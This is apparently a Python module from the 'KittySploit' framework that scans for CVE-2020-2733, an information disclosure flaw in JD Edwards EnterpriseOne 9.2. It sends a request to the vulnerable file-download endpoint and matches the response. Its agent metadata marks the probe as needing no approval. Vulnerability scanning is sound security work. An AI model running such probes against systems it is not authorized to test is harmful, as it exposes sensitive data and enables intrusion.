#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JD Edwards EnterpriseOne Tools 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'JD Edwards EnterpriseOne Tools 9.2 - Information Disclosure Detection',
        'description': 'JD Edwards EnterpriseOne Tools 9.2 is susceptible to information disclosure via the Monitoring and Diagnostics component. An attacker with network access via HTTP can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'oracle', 'weblogic', 'disclosure', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://redrays.io/cve-2020-2733-jd-edwards/',
            'https://www.oracle.com/security-alerts/cpuapr2020.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-2733',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-2733',
    }

    def run(self):
        r = self.http_request(method="GET", path='/manage/fileDownloader?sec=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('ACHCJK',)
        header_any = ('text/plain',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="JD Edwards EnterpriseOne Tools 9.2 - Information Disclosure detected",
                path='/manage/fileDownloader?sec=1',
            )
            return True
        return False

